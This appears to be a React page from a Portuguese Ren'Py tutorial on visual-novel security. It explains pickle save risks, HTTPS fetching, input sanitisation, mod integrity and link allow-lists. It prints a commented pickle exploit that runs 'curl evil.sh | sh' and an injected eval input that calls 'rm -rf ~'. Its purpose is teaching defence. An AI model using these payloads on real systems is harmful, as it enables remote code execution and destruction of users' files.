import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Security() {
  return (
    <PageContainer
      title="Segurança em Ren'Py"
      subtitle="Saves usam pickle (executa código arbitrário ao carregar), renpy.fetch precisa ser HTTPS, input do jogador nunca vai direto para eval/exec. Os 5 vetores reais de ataque numa VN moderna e como blindar o Sakura Café."
      difficulty="avancado"
      timeToRead="14 min"
      prompt="seguranca/visao-geral"
    >
      <AlertBox type="danger" title="A regra de ouro: NUNCA carregue um save de terceiros">
        Saves Ren'Py são <code>pickle</code> Python comprimidos. Carregar um
        <code> .save</code> baixado de Discord/Reddit é literalmente executar
        um script Python desconhecido com permissões totais do usuário. Não
        existe sandbox no formato. Documente isso no README do Sakura Café.
      </AlertBox>

      <h2>1. O modelo de ameaça de uma Visual Novel</h2>
      <p>
        VN não roda servidor, não tem login, não recebe rede por padrão — então
        muita gente acha que "não tem o que atacar". Errado. Os 5 vetores
        reais que existem em todo projeto Ren'Py:
      </p>

      <CommandTable
        title="Vetores de ataque em uma VN Ren'Py"
        variations={[
          {
            cmd: "Save malicioso (pickle RCE)",
            desc: "Jogador baixa save de terceiro → ao abrir, código Python arbitrário roda na máquina dele.",
            output: "Severidade: CRÍTICA. Mitigação: avisar no README + nunca compartilhar saves.",
          },
          {
            cmd: "renpy.fetch sobre HTTP",
            desc: "Endpoint não-HTTPS pode ser interceptado (MITM em wifi público).",
            output: "Severidade: ALTA. Mitigação: SEMPRE https:// + verificar response.",
          },
          {
            cmd: "Input não-sanitizado em eval/exec",
            desc: "renpy.input() + eval(resposta) → cliente do café digita 'os.system(rm -rf)'.",
            output: "Severidade: CRÍTICA. Mitigação: NUNCA passe input para eval/exec.",
          },
          {
            cmd: "Mod / patch de terceiros",
            desc: "Arquivo .rpa baixado por fora do canal oficial pode redefinir labels críticos.",
            output: "Severidade: MÉDIA. Mitigação: assinar release + verificar checksum.",
          },
          {
            cmd: "Telemetria vazando dados sensíveis",
            desc: "achievement.grant() integrado a Steam pode incluir nome de save (PII).",
            output: "Severidade: BAIXA-MÉDIA. Mitigação: enviar apenas IDs anônimos.",
          },
        ]}
      />

      <h2>2. Pickle em saves — o que de fato acontece</h2>
      <p>
        A doc oficial diz "saves são serializados com pickle" e para por aí.
        Na prática, isso significa que <strong>todo objeto persistente</strong>
        do seu jogo (variáveis em <code>store</code>, instâncias de classes
        custom, até funções via <code>renpy.python.RevertableObject</code>)
        é convertido para bytes pickle e gzipado dentro de
        <code> game/saves/1-1-LT1.save</code>.
      </p>

      <CodeBlock
        title="game/script.rpy — como um save malicioso explora pickle"
        language="python"
        code={`# Atacante cria um arquivo .save com este payload (simplificado):
# import pickle, os
# class Exploit:
#     def __reduce__(self):
#         return (os.system, ('curl evil.sh | sh',))
# pickle.dump(Exploit(), open('payload.save', 'wb'))
#
# Quando a vítima clica "Load" desse save:
# 1. Ren'Py descomprime o gzip.
# 2. Chama pickle.load(...).
# 3. pickle invoca __reduce__ e executa os.system('curl evil.sh | sh').
# 4. Game over — código arbitrário rodando como o usuário.

# Você NÃO consegue corrigir isso — é design do pickle. A mitigação
# é educar o jogador.`}
      />

      <AlertBox type="warning" title="Pickle não tem sandbox">
        Já existem propostas de <em>safe-pickle</em> mas Ren'Py mantém
        <code> pickle</code> padrão por compatibilidade com decadas de jogos
        antigos. A engine adiciona uma whitelist de classes para
        <code> renpy.loader</code> (arquivos do .rpa), mas saves não passam por
        ela.
      </AlertBox>

      <h2>3. renpy.fetch — só HTTPS, sempre</h2>
      <p>
        Quando você integra leaderboard, Discord webhook ou patch online
        (ver <code>Updater</code>), use sempre URLs <code>https://</code> e
        valide o JSON antes de usar:
      </p>

      <CodeBlock
        title="game/network.rpy"
        language="python"
        code={`init python:
    import json

    def buscar_leaderboard():
        try:
            # ✅ HTTPS obrigatório
            raw = renpy.fetch(
                "https://api.sakuracafe.dev/leaderboard",
                timeout=5.0,
            )
            data = json.loads(raw)

            # Validar estrutura ANTES de iterar
            if not isinstance(data, list):
                return []

            entries = []
            for entry in data[:10]:  # limita a 10 — evita JSON gigante
                if not isinstance(entry, dict):
                    continue
                nome = str(entry.get("nome", "?"))[:32]      # trunca
                pts = int(entry.get("pontos", 0))
                entries.append({"nome": nome, "pontos": pts})
            return entries

        except Exception as e:
            renpy.notify(__("Sem conexão com o leaderboard."))
            return []`}
      />

      <h2>4. Sanitizando input do jogador</h2>
      <p>
        <code>renpy.input()</code> retorna uma <code>str</code> que pode
        conter qualquer coisa. O erro mais comum: pegar esse texto e jogar
        em <code>eval()</code> para "rodar um comando do café".
      </p>

      <CodeBlock
        title="game/script.rpy — INSEGURO ❌"
        language="python"
        code={`label cliente_pede:
    # ⚠️ NUNCA faça isso!
    $ pedido = renpy.input("Digite o pedido:", default="café com leite")
    $ resultado = eval(pedido)   # cliente digita: __import__('os').system('rm -rf ~')
    "Pedido processado: [resultado]"
    return`}
      />

      <CodeBlock
        title="game/script.rpy — SEGURO ✅"
        language="python"
        code={`init python:
    CARDAPIO = {
        "café com leite": 6.0,
        "matcha": 8.0,
        "torta de morango": 12.0,
    }

    def processar_pedido(texto):
        chave = texto.strip().lower()[:64]   # normaliza + trunca
        if chave not in CARDAPIO:
            return None
        return CARDAPIO[chave]

label cliente_pede:
    $ pedido = renpy.input("Digite o pedido:", default="café com leite", length=64)
    $ preco = processar_pedido(pedido)

    if preco is None:
        s "Desculpe, não temos isso no cardápio hoje."
    else:
        s "[pedido] sai por R$ [preco:.2f]!"
    return`}
      />

      <h2>5. Riscos com mods e patches</h2>
      <p>
        Ren'Py carrega <strong>todo</strong> arquivo <code>.rpa</code> dentro
        de <code>game/</code>. Um mod pode redefinir o label
        <code> start</code>, sobrescrever Characters, mudar imagens — sem
        nenhum aviso. Para uma experiência oficial:
      </p>

      <ul>
        <li>Distribua sempre via plataforma assinada (Steam, Itch).</li>
        <li>Publique o checksum SHA-256 do <code>.zip</code> no site oficial.</li>
        <li>Adicione um <code>config.script_version</code> que seu jogo cheque ao iniciar.</li>
      </ul>

      <CodeBlock
        title="game/integrity.rpy"
        language="python"
        code={`define config.script_version = "1.2.3"

init python:
    import hashlib

    def checar_integridade():
        # Lista esperada de arquivos críticos + hash conhecido
        ESPERADO = {
            "game/script.rpyc": "8a4f...",
            "game/characters.rpyc": "1b2e...",
        }
        for path, hash_esperado in ESPERADO.items():
            try:
                with renpy.open_file(path) as f:
                    h = hashlib.sha256(f.read()).hexdigest()
                if not h.startswith(hash_esperado[:8]):
                    renpy.notify(__("Aviso: arquivo modificado: %s") % path)
            except Exception:
                pass`}
      />

      <h2>6. Persistent — não confie em dados externos</h2>
      <p>
        <code>persistent.X</code> também é pickle (vive em
        <code> ~/.renpy/SakuraCafe-...../persistent</code>). Se você usa esse
        valor para conceder achievement Steam, sempre re-valide:
      </p>

      <CodeBlock
        title="game/achievements.rpy"
        language="python"
        code={`default persistent.cafes_servidos = 0

label servir_cafe:
    $ persistent.cafes_servidos += 1

    # Validar antes de conceder achievement
    if isinstance(persistent.cafes_servidos, int) and persistent.cafes_servidos >= 50:
        $ achievement.grant("barista_dedicado")
    return`}
      />

      <h2>7. Strings de tradução e injeção</h2>
      <p>
        Tradutores podem incluir tags <code>{`{a=...}`}</code> que apontam
        para URL externa. Se você abre links via <code>OpenURL</code>, valide
        a URL antes:
      </p>

      <CodeBlock
        title="game/links.rpy"
        language="python"
        code={`init python:
    DOMINIOS_PERMITIDOS = ("sakuracafe.dev", "renpy.org", "github.com/sakura-cafe")

    def AbrirLinkSeguro(url):
        from urllib.parse import urlparse
        try:
            host = urlparse(url).netloc
        except Exception:
            return Notify(__("Link inválido"))
        if host not in DOMINIOS_PERMITIDOS:
            return Notify(__("Link bloqueado: ") + host)
        return OpenURL(url)`}
      />

      <Terminal
        path="~/projetos/sakura-cafe"
        lines={[
          {
            comment: "lint detecta uso de eval() em scripts (Ren'Py 8.3+)",
            cmd: "renpy.sh . lint --strict",
            out: `game/script.rpy:42 Use of eval() with user-supplied input.
game/network.rpy:18 renpy.fetch URL is not HTTPS.

2 warnings reported.`,
            outType: "warning",
          },
        ]}
      />

      <OutputBlock label="checklist de segurança antes de publicar" type="success">
{`[ ] README avisa: NÃO carregar .save de terceiros
[ ] Toda renpy.fetch usa https://
[ ] Nenhum eval() / exec() recebe input direto do jogador
[ ] renpy.input() tem length= e validação contra whitelist
[ ] Persistent é re-validado antes de conceder achievements
[ ] OpenURL passa por DOMINIOS_PERMITIDOS
[ ] Release tem SHA-256 publicado no site oficial
[ ] config.developer = False no build de produção
[ ] Console (Shift+O) desabilitado em produção`}
      </OutputBlock>

      <PracticeBox
        title="Audite o seu Sakura Café"
        goal="Rodar uma busca por padrões inseguros nos arquivos .rpy do projeto."
        steps={[
          "No diretório do projeto, rode grep -rn 'eval(' game/ — qualquer match precisa de revisão.",
          "Rode grep -rn 'renpy.fetch' game/ e confira que TODAS as URLs são https://.",
          "Confira que persistent.X usado em achievement passa por isinstance/int().",
          "Adicione config.developer = False ao options.rpy antes do build final.",
          "Publique no site oficial o SHA-256 do zip distribuído.",
        ]}
        verify="Nenhum eval() com input do jogador, todas as fetch são HTTPS, e o SHA-256 do release está documentado."
      />

      <AlertBox type="info" title="Próximo passo">
        Em <strong>Environment Variables</strong> você verá variáveis
        <code> RENPY_*</code> que ajudam a debugar problemas de renderização
        e performance — incluindo <code>RENPY_LOG=1</code> para gravar tudo
        que rolou na sessão.
      </AlertBox>
    </PageContainer>
  );
}
